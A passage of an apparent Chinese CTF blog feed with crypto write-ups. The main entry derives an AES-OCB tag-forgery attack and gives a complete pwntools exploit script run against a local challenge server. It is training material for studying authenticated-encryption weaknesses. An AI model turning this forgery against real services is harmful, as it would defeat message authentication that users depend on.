    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for 红明谷 crypto</title>
    <link href="http://example.com/2021/04/04/Wp_for_%E7%BA%A2%E6%98%8E%E8%B0%B7_crypto/"/>
    <id>http://example.com/2021/04/04/Wp_for_%E7%BA%A2%E6%98%8E%E8%B0%B7_crypto/</id>
    <published>2021-04-03T17:26:50.000Z</published>
    <updated>2021-04-05T13:54:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-红明谷-39-s-crypto"><a href="#Writeup-for-红明谷-39-s-crypto" class="headerlink" title="Writeup for 红明谷&#39;s crypto"></a>Writeup for 红明谷&#39;s crypto</h1><p>不知道是为啥，只有一个难题，虽然巨难无比，但收获不小</p><h2 id="RSAattack"><a href="#RSAattack" class="headerlink" title="RSAattack"></a>RSAattack</h2><p>$e&#x3D;3$ $c$ 远小于 $n$ ，直接开方就完了</p><h2 id="ezCRT"><a href="#ezCRT" class="headerlink" title="ezCRT"></a>ezCRT</h2><p>和VNCTF的factor是一个题，换一下数据直接出</p><h2 id="babyFogery"><a href="#babyFogery" class="headerlink" title="babyFogery"></a>babyFogery</h2><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>加密模式为<a href="https://github.com/kravietz/pyOCB">AES.OCB</a>，服务器提供加密和解密功能，<code>getflag</code>的要求如下：</p><ul><li>associate_data为<code>from Alice</code></li><li>明文为<code>please_give_me_the_flag</code></li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>阅读整体代码，掌握AES.OCB模式的特点与加解密过程如下：</p><p>（本文只说明对该题有意义的函数与特点，如果想仔细了解请阅读<code>github</code>上的源代码）</p><blockquote><p>后文中 $E(),D()$ 表示AES.OCB内部的 $aes.encrypt(),aes.decrypt()$</p></blockquote><h4 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h4><p>AES.OCB在解密时会对 $tag$ 与 $cipher$ 进行认证，如果发现与加密时的不同，则不会返回解密后的 明文，所以这一点要求我们在伪造 $cipher$ 和同时要对 $tag$ 进行伪造，使得其通过认证检测，我们才能得到明文，才能保证连接不被中断</p><h4 id="pmac"><a href="#pmac" class="headerlink" title="pmac"></a><strong>pmac</strong></h4><p>是一种加密（或处理）<code>associate_data</code>的函数，其输出结果只与内部 $aes$ 和 $header$ 参数有关</p><h4 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a><strong>encrypt</strong></h4><p>AES.OCB加密函数，对于除去最后一块的前面所有明文块，其满足<br>$$<br>c_i&#x3D;2^i\cdot E(nonce) \bigoplus E(2^i\cdot E(nonce) \bigoplus m_i)<br>$$<br>而对与最后一块，其满足<br>$$<br>c_n&#x3D;m_n \bigoplus E(2^n\cdot E(nonce)\bigoplus len(0^n))<br>$$<br>而加密时的 $tag$ 与其他参数，满足<br>$$<br>checksum&#x3D;\bigoplus^n_{i&#x3D;1}m_i<br>$$<br>$$<br>tag&#x3D;E(3\cdot 2^n\cdot E(nonce)\bigoplus checksum)<br>$$<br>另外，如果 $header&gt;0$ ，则新的 $tag&#x3D;tag\bigoplus header$ ，此外，一个 $nonce$ 只能够被使用一次</p><h4 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a><strong>decrypt</strong></h4><p>AES.OCB解密函数，对于除去最后一块的前面所有明文块，其满足<br>$$<br>m_i&#x3D;D(c_i\bigoplus 2^i\cdot E(nonce)) \bigoplus 2^i\cdot E(nonce)<br>$$<br>而对与最后一块，其满足<br>$$<br>m_n&#x3D;c_n \bigoplus E(2^n\cdot E(nonce)\bigoplus len(0^n))<br>$$<br>解密时的 $checktag$ 与其他参数，满足<br>$$<br>checksum&#x3D;\bigoplus^n_{i&#x3D;1}m_i<br>$$<br>$$<br>checktag&#x3D;E(3\cdot 2^n\cdot E(nonce)\bigoplus checksum)<br>$$<br>同样的，如果 $header&gt;0$ ，则新的 $checktag&#x3D;checktag\bigoplus header$</p><p>如果 $cipher$ 或 $tag$ 被检测出被修改过，则直接返回 $(False,[])$ ，否则返回 $(True,[message])$</p><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>很显然，我们本地无法加密的原因是因为AES.OCB模式内部的 $aes$ 我们无法使用，另外在线的加密函数我们无法使得<code>associate_data</code>为<code>from Alice</code>，所以只要我们能够求出 $msg$ 所对应的 $E(msg)$ ，这个问题就会迎刃而解（任意加密攻击）</p><p>这里我们这样构造<br>$$<br>m_1&#x3D;len(0^n)&#x3D;15\times b’\x00’+b’\x80’~~~~~<br>m_2&#x3D;0&#x3D;16\times b’\x00’<br>$$</p><p>那么 $m_1$ 会被当作非最后一块加密<br>$$<br>c_1&#x3D;2\cdot E(nonce)\bigoplus E(2\cdot E(nonce)\bigoplus m_1)<br>$$</p><p>$$<br>c_2&#x3D;m_2\bigoplus E(4\cdot E(nonce)\bigoplus len(0^n))\<br>&#x3D;E(4\cdot E(nonce)\bigoplus len(0^n))<br>$$</p><p>随后调用解密函数时只提交 $c1$ ，此时会被当作最后一块解密，那么我们会发现<br>$$<br>m_1&#x3D;c_1\bigoplus E(2\cdot E(nonce)\bigoplus m_1) \<br>&#x3D;\underbrace{2\cdot E(nonce)\bigoplus E(2\cdot E(nonce)\bigoplus len(0^n))}_{c_1}\bigoplus E(2\cdot E(nonce)\bigoplus m_1)<br>$$<br>而我们构造的 $m_1&#x3D;len(0^n)$ ，那么显然 $m_1&#x3D;2\cdot E(nonce)$ ，此时，我们就能够轻松算出 $E(nonce)$ ！</p><p>但因为AES.OCB的认证特殊性，我们需要使得伪造 $tag$ 来通过认证检测，这里我们选择令 $header$ 为空，那么此时的<br>$$<br>checktag&#x3D;E(6\cdot E(nonce)\bigoplus 2\cdot E(nonce))\<br>&#x3D;E(4\cdot E(nonce))<br>$$<br>如何能得到这个玩意呢？</p><p>当我们再次稍微变化一下 $c_1&#x3D;c_1\bigoplus m1$ 后，我们发现此时<br>$$<br>checktag&#x3D;E(m_1\bigoplus 6\cdot E(nonce)\bigoplus 2\cdot E(nonce))\<br>&#x3D;E(m_1\bigoplus 4\cdot E(nonce))&#x3D;c_2<br>$$<br>也就是说，我们给在线 $decrypt$ 函数提供的数据分别为： $nonce$ 为加密时的 $nonce$ ， $tag$ 为 $c_2$ ， $c &#x3D; c_1$ ， $header$ 为空，这样就能够成功通过客户端的认证检查，并且得到 $2\cdot E(nonce)$ ，对 $times2$ 函数写个逆即可求得 $E(nonce)$</p><p>此时，我们即可对于任意的 $nonce$ ，都能得到其对应的 $E(nonce)$ ，但是对于任意的明文 $m$ ，并不能自如的完成任意加密，那么我们现在相当于已经有了 $nonce$ 与其对应的 $E(nonce)$ ，如何来完成任意加密的效果呢？</p><p>这里我们为了便于解释，我们记 $L&#x3D;E(nonce)$ 、$L’&#x3D;E(2\cdot L\bigoplus m_1)$ ，那么可以轻松算得 $L’&#x3D;c_1\bigoplus 2\cdot L$ ，我们再次使用客户端的 $encrypt$ 函数，但这次我们的 $nonce&#x3D;2\cdot L\bigoplus m_1$ ，$m&#x3D;message\bigoplus2\cdot L’$ ，那么 $c&#x3D;2\cdot L’\bigoplus E(message\bigoplus2\cdot L’\bigoplus2\cdot L’)$ ，我们就能轻松算出 $E(message)&#x3D;c\bigoplus 2\cdot L’$</p><p>我们将前面所有的过程看作一个函数，即使用一个 $nonce$ 名额，来得到我想要的 $aes.encrypt(message)$ ，那么此时所有的加密过程都可以在本地完成，直接在本地计算题目所需要的 $cipher$ 与 $tag$ ，直接打给服务器即可</p><p><img src="/img/babyForgerysuccess.png" alt="success"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">times2</span>(<span class="params">input_data,blocksize = <span class="number">16</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(input_data) == blocksize</span><br><span class="line">    output =  <span class="built_in">bytearray</span>(blocksize)</span><br><span class="line">    carry = input_data[<span class="number">0</span>] &gt;&gt; <span class="number">7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_data) - <span class="number">1</span>):</span><br><span class="line">        output[i] = ((input_data[i] &lt;&lt; <span class="number">1</span>) | (input_data[i + <span class="number">1</span>] &gt;&gt; <span class="number">7</span>)) % <span class="number">256</span></span><br><span class="line">    output[-<span class="number">1</span>] = ((input_data[-<span class="number">1</span>] &lt;&lt; <span class="number">1</span>) ^ (carry * <span class="number">0x87</span>)) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(output) == blocksize</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">times3</span>(<span class="params">input_data</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(input_data) == <span class="number">16</span></span><br><span class="line">    output = times2(input_data)</span><br><span class="line">    output = xor_block(output, input_data)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(output) == <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back_times2</span>(<span class="params">output_data,blocksize = <span class="number">16</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(output_data) == blocksize</span><br><span class="line">    input_data =  <span class="built_in">bytearray</span>(blocksize)</span><br><span class="line">    carry = output_data[-<span class="number">1</span>] &amp; <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output_data) - <span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">        input_data[i] = (output_data[i] &gt;&gt; <span class="number">1</span>) | ((output_data[i-<span class="number">1</span>] % <span class="number">2</span>) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">    input_data[<span class="number">0</span>] = (carry &lt;&lt; <span class="number">7</span>) | (output_data[<span class="number">0</span>] &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print(carry)</span></span><br><span class="line">    <span class="keyword">if</span>(carry):</span><br><span class="line">        input_data[-<span class="number">1</span>] = ((output_data[-<span class="number">1</span>] ^ (carry * <span class="number">0x87</span>)) &gt;&gt; <span class="number">1</span>) | ((output_data[-<span class="number">2</span>] % <span class="number">2</span>) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(input_data) == blocksize</span><br><span class="line">    <span class="keyword">return</span> input_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_block</span>(<span class="params">input1, input2</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(input1) == <span class="built_in">len</span>(input2)</span><br><span class="line">    output = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input1)):</span><br><span class="line">        output.append(input1[i] ^ input2[i])</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">input</span>,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter username &gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Arbitrary_encrypt</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="comment"># to get aes.encrypt(msg)</span></span><br><span class="line"></span><br><span class="line">    num = <span class="built_in">bytearray</span>(os.urandom(<span class="number">16</span>))</span><br><span class="line">    <span class="comment"># encrypt &quot;\x00&quot;*15+&quot;\x80&quot;+&quot;\x00&quot;*16</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">    r.sendline(num.<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter message &gt; &quot;</span>)</span><br><span class="line">    m = <span class="built_in">bytearray</span>(<span class="string">b&quot;\x00&quot;</span>*<span class="number">15</span> + <span class="string">b&quot;\x80&quot;</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">16</span>)</span><br><span class="line">    r.sendline(m.<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;ciphertext: &quot;</span>)</span><br><span class="line">    cipher = r.recvline(<span class="literal">False</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;tag: &quot;</span>)</span><br><span class="line">    tag = r.recvline(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># decrypt to solve L=E(nonce)</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">    r.sendline(num.<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter ciphertext &gt; &quot;</span>)</span><br><span class="line">    m0 = <span class="built_in">bytearray</span>(<span class="string">b&quot;\x00&quot;</span>*<span class="number">15</span> + <span class="string">b&quot;\x80&quot;</span>)</span><br><span class="line">    m1 = <span class="built_in">bytearray</span>(<span class="string">b&quot;\x00&quot;</span>*<span class="number">16</span>)</span><br><span class="line">    c0 = hex_to_bytes(cipher[:<span class="number">32</span>])</span><br><span class="line">    r.sendline(xor_block(c0,m0).<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter tag &gt; &quot;</span>)</span><br><span class="line">    c1 = cipher[<span class="number">32</span>:]</span><br><span class="line">    r.sendline(c1)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter associate data &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;message: &quot;</span>)</span><br><span class="line">    enc = xor_block(<span class="built_in">bytearray</span>(hex_to_bytes(r.recvline(<span class="literal">False</span>))),m0)</span><br><span class="line"></span><br><span class="line">    L = back_times2(enc)</span><br><span class="line">    LL = enc</span><br><span class="line">    LLL = xor_block(LL,c0)</span><br><span class="line">    <span class="comment"># print(L)</span></span><br><span class="line">    <span class="comment"># print(LL)</span></span><br><span class="line">    <span class="comment"># print(LLL)</span></span><br><span class="line">    <span class="comment"># L=L 2L=LL L&#x27;=LLL m0=m0</span></span><br><span class="line">    msg = <span class="built_in">bytearray</span>(msg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encrypt msg</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">    r.sendline(xor_block(LL,m0).<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter message &gt; &quot;</span>)</span><br><span class="line">    r.sendline(xor_block(msg,times2(LLL)).<span class="built_in">hex</span>()+m1.<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;ciphertext: &quot;</span>)</span><br><span class="line">    enc = <span class="built_in">bytearray</span>(hex_to_bytes(r.recvline(<span class="literal">False</span>))[:<span class="number">16</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">return</span> xor_block(enc,times2(LLL))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_pmac</span>(<span class="params">header, blocksize = <span class="number">16</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(header)</span><br><span class="line">    m = <span class="built_in">int</span>(<span class="built_in">max</span>(<span class="number">1</span>, math.ceil(<span class="built_in">len</span>(header) / <span class="built_in">float</span>(blocksize))))</span><br><span class="line">    offset = Arbitrary_encrypt(<span class="built_in">bytearray</span>([<span class="number">0</span>] * blocksize))</span><br><span class="line">    offset = times3(offset)</span><br><span class="line">    offset = times3(offset)</span><br><span class="line">    checksum = <span class="built_in">bytearray</span>(blocksize)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m - <span class="number">1</span>):</span><br><span class="line">        offset = times2(offset)</span><br><span class="line">        H_i = header[(i * blocksize):(i * blocksize) + blocksize]</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(H_i) == blocksize</span><br><span class="line">        xoffset = xor_block(H_i, offset)</span><br><span class="line">        encrypted = Arbitrary_encrypt(xoffset)</span><br><span class="line">        checksum = xor_block(checksum, encrypted)</span><br><span class="line">    offset = times2(offset)</span><br><span class="line">    H_m = header[((m - <span class="number">1</span>) * blocksize):]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(H_m) &lt;= blocksize</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(H_m) == blocksize:</span><br><span class="line">        offset = times3(offset)</span><br><span class="line">        checksum = xor_block(checksum, H_m)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        H_m.append(<span class="built_in">int</span>(<span class="string">&#x27;10000000&#x27;</span>, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(H_m) &lt; blocksize:</span><br><span class="line">            H_m.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(H_m) == blocksize</span><br><span class="line">        </span><br><span class="line">        checksum = xor_block(checksum, H_m)</span><br><span class="line">        offset = times3(offset)</span><br><span class="line">        offset = times3(offset)</span><br><span class="line">    final_xor = xor_block(offset, checksum)</span><br><span class="line">    auth = Arbitrary_encrypt(final_xor)</span><br><span class="line">    <span class="keyword">return</span> auth</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_ocb_encrypt</span>(<span class="params">plaintext, header, nonce, blocksize = <span class="number">16</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> nonce</span><br><span class="line">    m = <span class="built_in">int</span>(<span class="built_in">max</span>(<span class="number">1</span>, math.ceil(<span class="built_in">len</span>(plaintext) / <span class="built_in">float</span>(blocksize))))</span><br><span class="line">    offset = Arbitrary_encrypt(nonce)</span><br><span class="line">    checksum = <span class="built_in">bytearray</span>(blocksize)</span><br><span class="line">    ciphertext = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m - <span class="number">1</span>):</span><br><span class="line">        offset = times2(offset)</span><br><span class="line">        M_i = plaintext[(i * blocksize):(i * blocksize) + blocksize]</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(M_i) == blocksize</span><br><span class="line">        checksum = xor_block(checksum, M_i)</span><br><span class="line">        xoffset = Arbitrary_encrypt(xor_block(M_i, offset))</span><br><span class="line">        ciphertext += xor_block(offset, xoffset)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ciphertext) % blocksize == <span class="number">0</span></span><br><span class="line">    M_m = plaintext[((m - <span class="number">1</span>) * blocksize):]</span><br><span class="line">    offset = times2(offset)</span><br><span class="line">    bitlength = <span class="built_in">len</span>(M_m) * <span class="number">8</span></span><br><span class="line">    <span class="keyword">assert</span> bitlength &lt;= blocksize * <span class="number">8</span></span><br><span class="line">    tmp = <span class="built_in">bytearray</span>(blocksize)</span><br><span class="line">    tmp[-<span class="number">1</span>] = bitlength</span><br><span class="line">    pad = Arbitrary_encrypt(xor_block(tmp, offset))</span><br><span class="line">    tmp = <span class="built_in">bytearray</span>()</span><br><span class="line">    C_m = xor_block(M_m, pad[:<span class="built_in">len</span>(M_m)])</span><br><span class="line">    ciphertext += C_m</span><br><span class="line">    tmp = M_m + pad[<span class="built_in">len</span>(M_m):]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(tmp) == blocksize</span><br><span class="line">    checksum = xor_block(tmp, checksum)</span><br><span class="line">    offset = times3(offset)</span><br><span class="line">    tag = Arbitrary_encrypt(xor_block(checksum, offset))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(header) &gt; <span class="number">0</span>:</span><br><span class="line">        tag = xor_block(tag, my_pmac(header))</span><br><span class="line">    <span class="keyword">return</span> (tag, ciphertext)</span><br><span class="line"></span><br><span class="line">finalnonce = <span class="built_in">bytearray</span>(hex_to_bytes(<span class="string">&#x27;11&#x27;</span>*<span class="number">16</span>))</span><br><span class="line">finaltag,finalcipher = (my_ocb_encrypt(<span class="built_in">bytearray</span>(<span class="string">b&#x27;please_give_me_the_flag&#x27;</span>),<span class="built_in">bytearray</span>(<span class="string">b&#x27;from Alice&#x27;</span>),finalnonce))</span><br><span class="line"></span><br><span class="line">finaltag = finaltag.<span class="built_in">hex</span>()</span><br><span class="line">finalnonce = finalnonce.<span class="built_in">hex</span>()</span><br><span class="line">finalcipher = finalcipher.<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(finaltag)</span></span><br><span class="line"><span class="comment"># print(finalnonce)</span></span><br><span class="line"><span class="comment"># print(finalcipher)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">r.sendline(finalnonce)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter ciphertext &gt; &quot;</span>)</span><br><span class="line">r.sendline(finalcipher)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter tag &gt; &quot;</span>)</span><br><span class="line">r.sendline(finaltag)</span><br><span class="line"></span><br><span class="line">flag = r.recvline()</span><br><span class="line"><span class="keyword">if</span>(<span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag):</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-红明谷-39-s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-红明谷-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for 红明谷&amp;#39;s crypto&quot;&gt;&lt;/a&gt;Writ</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for MAR DASCTF&#39;s crypto</title>
    <link href="http://example.com/2021/03/27/Writeup_for_MAR_DASCTF&#39;s_crypto/"/>
    <id>http://example.com/2021/03/27/Writeup_for_MAR_DASCTF&#39;s_crypto/</id>
    <published>2021-03-27T10:30:26.000Z</published>
    <updated>2021-03-27T10:21:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-MAR-DASCTF’s-crypto"><a href="#Writeup-for-MAR-DASCTF’s-crypto" class="headerlink" title="Writeup for MAR DASCTF’s crypto"></a>Writeup for MAR DASCTF’s crypto</h1><h2 id="crypto-threshold"><a href="#crypto-threshold" class="headerlink" title="crypto_threshold"></a>crypto_threshold</h2><p>签到题，给了LCG的所有参数，而且求的还是后一位，求得 $e$</p><p>RSA部分给的<code>_lambda</code>和我上次出的VNCTF的<code>hint</code>是一个样子，求得明文</p><h2 id="FeedBack"><a href="#FeedBack" class="headerlink" title="FeedBack"></a>FeedBack</h2><p>给了个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cycle</span>(<span class="params">c:<span class="built_in">list</span>,a:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y: x+y,<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x[<span 